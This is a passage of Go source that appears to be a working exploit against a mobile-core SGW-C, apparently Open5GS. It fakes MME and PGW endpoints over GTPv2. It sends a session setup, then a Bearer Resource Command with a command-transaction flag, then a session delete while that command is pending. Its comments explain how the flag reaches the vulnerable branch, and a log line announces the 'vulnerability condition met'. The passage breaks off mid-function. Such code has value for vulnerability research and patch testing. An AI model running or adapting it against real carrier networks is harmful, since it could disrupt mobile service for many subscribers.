func startMMEServer(conn *net.UDPConn, sgwS11TeidCh chan<- uint32, updateReqCh chan<- bearerReqInfo) {
	log.Printf("[MME] Listening on %s", conn.LocalAddr())

	buf := make([]byte, 4096)
	for {
		n, raddr, err := conn.ReadFromUDP(buf)
		if err != nil {
			log.Printf("[MME] read error: %v", err)
			continue
		}
		msg, err := message.Parse(buf[:n])
		if err != nil {
			log.Printf("[MME] parse error: %v", err)
			continue
		}

		switch m := msg.(type) {
		case *message.CreateSessionResponse:
			sgwTeid := uint32(0)
			if m.SenderFTEIDC != nil {
				if v, err := m.SenderFTEIDC.TEID(); err == nil {
					sgwTeid = v
				}
			}
			if sgwTeid != 0 {
				select {
				case sgwS11TeidCh <- sgwTeid:
				default:
				}
				log.Printf("[MME] CreateSessionResponse from %s, SGW S11 TEID=0x%x", raddr, sgwTeid)
			}
		case *message.UpdateBearerRequest:
			ebi := ebiFromBearerContexts(m.BearerContexts, 5)
			req := bearerReqInfo{seq: m.Sequence(), ebi: ebi}
			select {
			case updateReqCh <- req:
			default:
			}
			log.Printf("[MME] UpdateBearerRequest from %s seq=0x%x ebi=%d (CMD flow)", raddr, req.seq, req.ebi)
		case *message.DeleteSessionResponse:
			log.Printf("[MME] DeleteSessionResponse from %s", raddr)
		case *message.Generic:
			// Handle Bearer Resource Failure Indication (type 69)
			if m.Header.Type == MsgTypeBearerResourceFailureIndication {
				log.Printf("[MME] BearerResourceFailureIndication from %s (expected if PGW not ready)", raddr)
			} else {
				log.Printf("[MME] recv Generic(%d) from %s", m.Header.Type, raddr)
			}
		default:
			log.Printf("[MME] recv %s from %s", msg.MessageTypeName(), raddr)
		}
	}
}

func startPGWServer(conn *net.UDPConn, pgwIP, paa string, pgwCtrlTeid uint32, sgwS5cCh chan<- s5cInfo,
	sgwcS5cRaddr *net.UDPAddr, defaultEbi uint8) {
	log.Printf("[PGW] Listening on %s", conn.LocalAddr())

	pgwUteid := randNonZeroUint32(0)
	var sgwTeid uint32
	var sgwS5cTeid uint32
	var brcReceived bool
	var brcSeq uint32 // Store BRC sequence for UpdateBearerRequest
	var storedEbi uint8 = defaultEbi

	buf := make([]byte, 4096)
	for {
		n, raddr, err := conn.ReadFromUDP(buf)
		if err != nil {
			log.Printf("[PGW] read error: %v", err)
			continue
		}
		msg, err := message.Parse(buf[:n])
		if err != nil {
			log.Printf("[PGW] parse error: %v", err)
			continue
		}

		switch m := msg.(type) {
		case *message.CreateSessionRequest:
			if m.SenderFTEIDC != nil {
				if v, err := m.SenderFTEIDC.TEID(); err == nil {
					sgwTeid = v
					sgwS5cTeid = v
				}
			}
			ebi := ebiFromCreateSessionRequest(m, defaultEbi)
			storedEbi = ebi
			select {
			case sgwS5cCh <- s5cInfo{sgwTeid: sgwTeid, ebi: ebi}:
			default:
			}

			resp := message.NewCreateSessionResponse(
				sgwTeid, m.Sequence(),
				ie.NewCause(gtpv2.CauseRequestAccepted, 0, 0, 0, nil),
				ie.NewFullyQualifiedTEID(gtpv2.IFTypeS5S8PGWGTPC, pgwCtrlTeid, pgwIP, "").WithInstance(1),
				ie.NewPDNAddressAllocation(paa),
				ie.NewAPNRestriction(gtpv2.APNRestrictionNoExistingContextsorRestriction),
				ie.NewBearerContext(
					ie.NewCause(gtpv2.CauseRequestAccepted, 0, 0, 0, nil),
					ie.NewEPSBearerID(ebi),
					ie.NewFullyQualifiedTEID(gtpv2.IFTypeS5S8PGWGTPU, pgwUteid, pgwIP, "").WithInstance(2),
					ie.NewBearerQoS(1, 9, 1, 1, 0, 0, 0, 0),
				),
			)
			if err := sendMsg(conn, raddr, resp); err != nil {
				log.Printf("[PGW] send CSRsp error: %v", err)
			} else {
				log.Printf("[PGW] CSRsp sent to %s (SGW TEID=0x%x, EBI=%d)", raddr, sgwTeid, ebi)
			}

		case *message.Generic:
			// Handle Bearer Resource Command (type 68)
			if m.Header.Type == MsgTypeBearerResourceCommand {
				brcReceived = true
				brcSeq = m.Sequence() // CRITICAL: Save BRC sequence for UpdateBearerRequest
				log.Printf("[PGW] BearerResourceCommand from %s seq=0x%x (saved for UBR)", raddr, brcSeq)

				// Extract Linked EBI from Bearer Resource Command
				for _, ieItem := range m.IEs {
					if ieItem != nil && ieItem.Type == ie.EPSBearerID {
						if v, err := ieItem.EPSBearerID(); err == nil && v != 0 {
							storedEbi = v
							break
						}
					}
				}

				// Respond with UpdateBearerRequest using SAME SEQUENCE as BRC
				// This is CRITICAL: SGW-C uses sequence to find the original s5c_xact
				// When xid has CMD flag, UpdateBearerRequest is INTERMEDIATE_STAGE
				// SGW-C will find original s5c_xact in local_list and reuse associated s11_xact
				time.Sleep(100 * time.Millisecond) // Small delay to ensure transaction is set up

				ubr := message.NewUpdateBearerRequest(
					sgwS5cTeid, brcSeq, // Use BRC sequence (with CMD flag) to associate transactions
					ie.NewBearerContext(
						ie.NewEPSBearerID(storedEbi),
						ie.NewBearerQoS(1, 9, 1, 1, 0, 0, 0, 0), // QoS update
					),
				)
				if err := sendMsg(conn, raddr, ubr); err != nil {
					log.Printf("[PGW] send UpdateBearerRequest error: %v", err)
				} else {
					log.Printf("[PGW] UpdateBearerRequest sent to %s (SGW S5C TEID=0x%x, EBI=%d, seq=0x%x) - BRC triggered", raddr, sgwS5cTeid, storedEbi, brcSeq)
				}
			} else {
				log.Printf("[PGW] recv Generic(%d) from %s", m.Header.Type, raddr)
			}

		case *message.DeleteSessionRequest:
			teid := sgwTeid
			if teid == 0 && m.SenderFTEIDC != nil {
				if v, err := m.SenderFTEIDC.TEID(); err == nil {
					teid = v
				}
			}
			resp := message.NewDeleteSessionResponse(
				teid, m.Sequence(),
				ie.NewCause(gtpv2.CauseRequestAccepted, 0, 0, 0, nil),
			)
			if err := sendMsg(conn, raddr, resp); err != nil {
				log.Printf("[PGW] send DSRsp error: %v", err)
			} else {
				log.Printf("[PGW] DSRsp sent to %s (SGW TEID=0x%x)", raddr, teid)
				if brcReceived {
					log.Printf("[PGW] Bearer deleted while BearerResourceCommand pending - vulnerability condition met")
				}
			}

		default:
			log.Printf("[PGW] recv %s from %s", msg.MessageTypeName(), raddr)
		}
	}
}

func sendCreateSessionRequest(conn *net.UDPConn, raddr *net.UDPAddr, imsi, apn, mcc, mnc, mmeIP, pgwIP string, mmeTeid, pgwTeid uint32, ebi uint8) error {
	senderFTEID := ie.NewFullyQualifiedTEID(gtpv2.IFTypeS11MMEGTPC, mmeTeid, mmeIP, "")
	pgwFTEID := ie.NewFullyQualifiedTEID(gtpv2.IFTypeS5S8PGWGTPC, pgwTeid, pgwIP, "").WithInstance(1)

	bearer := ie.NewBearerContext(
		ie.NewEPSBearerID(ebi),
		ie.NewBearerQoS(1, 9, 1, 1, 0, 0, 0, 0),
	)

	csr := message.NewCreateSessionRequest(
		0, randSeq(),
		ie.NewIMSI(imsi),
		ie.NewMSISDN("818000000001"),
		ie.NewMobileEquipmentIdentity("123456789012345"),
		ie.NewServingNetwork(mcc, mnc),
		ie.NewRATType(gtpv2.RATTypeEUTRAN),
		ie.NewIndicationFromOctets(0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
		senderFTEID,
		pgwFTEID,
		ie.NewAccessPointName(apn),
		ie.NewSelectionMode(gtpv2.SelectionModeMSorNetworkProvidedAPNSubscribedVerified),
		ie.NewPDNType(gtpv2.PDNTypeIPv4),
		ie.NewPDNAddressAllocation("0.0.0.0"),
		ie.NewAPNRestriction(gtpv2.APNRestrictionNoExistingContextsorRestriction),
		ie.NewAggregateMaximumBitRate(10000000, 10000000),
		bearer,
	)

	payload, err := csr.Marshal()
	if err != nil {
		return fmt.Errorf("marshal CSR: %w", err)
	}
	if _, err := conn.WriteToUDP(payload, raddr); err != nil {
		return fmt.Errorf("send CSR: %w", err)
	}
	return nil
}

func sendBearerResourceCommand(conn *net.UDPConn, raddr *net.UDPAddr, sgwTeid uint32, ebi uint8) error {
	// Traffic Aggregate Description (TAD) - minimal valid TFT
	// Format: TFT operation code (3 bits) + E bit (1 bit) + Number of packet filters (4 bits)
	// 0x21 = 001 (Create new TFT) + 0 (no E bit) + 0001 (1 filter)
	// Then minimal packet filter: direction + id + evaluation precedence + length + components
	tad := []byte{
		0x21,       // Operation: Create new TFT (001), E=0, 1 filter
		0x10,       // Direction: pre-rel7 (00), identifier (010000 = 16)
		0x01,       // Evaluation precedence
		0x01,       // Packet filter component length
		0x70,       // Component type: match all (0x70)
	}

	// CRITICAL: Bearer Resource Command MUST have OGS_GTP_CMD_XACT_ID (0x800000) set in sequence
	// This is how SGW-C identifies command-type transactions and enters the IF branch
	cmdSeq := randSeq() | 0x800000
	log.Printf("[MME] BearerResourceCommand seq=0x%x (CMD flag set)", cmdSeq)

	// Build Bearer Resource Command using Generic message
	brc := message.NewGeneric(
		MsgTypeBearerResourceCommand, // Type 68
		sgwTeid,
		cmdSeq,  // Sequence with OGS_GTP_CMD_XACT_ID flag
		ie.NewEPSBearerID(ebi),                                  // Linked EPS Bearer ID (mandatory)
		ie.NewProcedureTransactionID(1),                         // PTI (mandatory)
		ie.New(IETypeTrafficAggregateDescription, 0, tad),       // TAD (mandatory)
	)

	payload, err := brc.Marshal()
	if err != nil {
		return fmt.Errorf("marshal BearerResourceCommand: %w", err)
	}
	if _, err := conn.WriteToUDP(payload, raddr); err != nil {
		return fmt.Errorf("send BearerResourceCommand: %w", err)
	}
	return nil
}

func sendDeleteSessionRequest(conn *net.UDPConn, raddr *net.UDPAddr, sgwTeid uint32, ebi uint8) error {
	req := message.NewDeleteSessionRequest(
		sgwTeid, randSeq(),
		ie.NewEPSBearerID(ebi),
	)
	payload, err := req.Marshal()
	if err != nil {
		return fmt.Errorf("marshal DeleteSessionRequest: %w", err)
	}
	if _, err := conn.WriteToUDP(payload, raddr); err != nil {
		return fmt.Errorf("send DeleteSessionRequest: %w", err)
	}
	return nil
}

func sendUpdateBearerResponse(conn *net.UDPConn, raddr *net.UDPAddr, sgwTeid, seq uint32, ebi uint8) error {
	resp := message.NewUpdateBearerResponse(
		sgwTeid, seq,
		ie.NewCause(gtpv2.CauseRequestAccepted, 0, 0, 0, nil),
		ie.NewBearerContext(
			ie.NewEPSBearerID(ebi),
